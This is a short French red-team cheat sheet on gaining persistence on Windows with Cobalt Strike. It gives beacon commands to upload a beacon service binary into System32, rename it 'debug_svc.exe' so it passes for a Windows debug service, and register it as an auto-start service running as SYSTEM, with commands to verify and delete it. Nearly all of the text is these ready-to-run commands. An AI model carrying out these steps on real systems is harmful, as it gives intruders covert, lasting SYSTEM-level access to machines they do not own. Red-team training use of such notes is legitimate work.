
Possible de créer un service qui se lance au démarrage de la machine.



## Cobalt Strike

1. Upload notre exécutable qui servira de binaire de service

```
cd C:\Windows\System32\
upload C:\Payloads\beacon_x64.svc.exe
mv beacon_x64.svc.exe debug_svc.exe
```

2. Créer un service pointant vers notre binaire

```
sc_create dbgsvc "Debug Service" C:\Windows\System32\debug_svc.exe "Windows Debug Service" 0 2 3
```

3. Vérifier la bonne création du service et l'execution en SYSTEM

```
sc_qc dbgsvc
```


Supprimer le service

```
sc_delete dbgsvc
```
